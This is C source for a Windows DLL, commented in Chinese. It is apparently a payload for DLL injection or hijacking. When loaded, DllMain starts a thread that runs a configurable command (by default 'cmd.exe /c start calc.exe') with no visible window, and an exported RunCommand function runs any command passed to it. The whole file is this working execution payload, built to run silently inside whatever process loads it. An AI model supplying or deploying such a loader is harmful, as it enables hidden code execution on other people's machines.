#include <windows.h>
#include <stdio.h>

// 编译时定义要执行的命令（可通过预处理器宏自定义）
#ifndef PAYLOAD_CMD
#define PAYLOAD_CMD "cmd.exe /c start calc.exe"
#endif

// 线程函数，执行实际命令
DWORD WINAPI PayloadThread(LPVOID lpParam) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    BOOL success;

    // 执行命令
    success = CreateProcessA(
        NULL,
        (LPSTR)PAYLOAD_CMD,
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW,   // 避免弹出窗口
        NULL, NULL,
        &si, &pi
    );

    if (success) {
        // 等待进程结束（可选）
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}

// DLL 入口点
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    HANDLE hThread = NULL;

    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        // 禁止其他线程调用此 DLL 的 DllMain
        DisableThreadLibraryCalls(hinstDLL);

        // 创建线程执行 payload，避免在 DllMain 中执行复杂操作
        hThread = CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// 可选导出函数，供外部显式调用
__declspec(dllexport) void RunCommand(const char* cmd) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}